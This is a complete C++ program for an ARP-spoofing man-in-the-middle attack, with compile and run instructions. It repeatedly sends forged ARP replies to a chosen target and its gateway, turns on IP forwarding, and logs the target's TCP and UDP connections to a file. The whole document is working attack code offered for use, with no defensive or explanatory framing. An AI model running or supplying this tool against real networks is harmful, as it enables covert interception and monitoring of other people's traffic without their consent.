// Compile: g++ -o arp_log arp_log.cpp -lpthread
// Run: sudo ./arp_log <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>
// Requires: root privileges, IP forwarding enabled

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <fstream>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class ARPLoggingPoison {
private:
    int arpSock, packetSock;
    std::string iface, attackerMAC;
    std::atomic<bool> running{false};
    std::ofstream logFile;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    ARPLoggingPoison(const std::string& i, const std::string& amac)
        : iface(i), attackerMAC(amac) {
        arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        packetSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        bind(packetSock, (struct sockaddr*)&sll, sizeof(sll));
        
        logFile.open("arp_mitm.log", std::ios::app);
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop(const std::string& targetIP, const std::string& targetMAC,
                    const std::string& gatewayIP, const std::string& gatewayMAC) {
        while (running.load()) {
            sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
            sendARP(targetIP, attackerMAC, gatewayIP, gatewayMAC);
            usleep(500000);
        }
    }
    
    // Capture and log forwarded packets
    void logLoop(const std::string& targetIP) {
        uint8_t buffer[65536];
        struct in_addr targetAddr;
        inet_pton(AF_INET, targetIP.c_str(), &targetAddr);
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(packetSock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(packetSock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct iphdr* ip = (struct iphdr*)(buffer + 14);
            
            // Only log traffic involving target
            if (ip->saddr != targetAddr.s_addr && ip->daddr != targetAddr.s_addr) {
                continue;
            }
            
            char srcIP[INET_ADDRSTRLEN], dstIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip->saddr, srcIP, sizeof(srcIP));
            inet_ntop(AF_INET, &ip->daddr, dstIP, sizeof(dstIP));
            
            if (ip->protocol == IPPROTO_TCP) {
                struct tcphdr* tcp = (struct tcphdr*)(buffer + 14 + (ip->ihl * 4));
                logFile << "[TCP] " << srcIP << ":" << ntohs(tcp->source)
                        << " -> " << dstIP << ":" << ntohs(tcp->dest) << "\n";
                logFile.flush();
            } else if (ip->protocol == IPPROTO_UDP) {
                logFile << "[UDP] " << srcIP << " -> " << dstIP << "\n";
                logFile.flush();
            }
        }
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& gatewayIP, const std::string& gatewayMAC) {
        std::cout << "[*] ARP poisoning with packet logging\n";
        std::cout << "[*] Log file: arp_mitm.log\n";
        
        // Enable IP forwarding
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        
        running = true;
        std::thread poisonThread(&ARPLoggingPoison::poisonLoop, this,
                                 targetIP, targetMAC, gatewayIP, gatewayMAC);
        std::thread logThread(&ARPLoggingPoison::logLoop, this, targetIP);
        
        std::cout << "[*] Running... Press Ctrl+C to stop\n";
        while (true) sleep(1);
    }
    
    ~ARPLoggingPoison() {
        running = false;
        if (logFile.is_open()) logFile.close();
        close(arpSock);
        close(packetSock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>\n";
        return 1;
    }
    ARPLoggingPoison poison(argv[6], argv[5]);
    poison.run(argv[1], argv[2], argv[3], argv[4]);
    return 0;
}
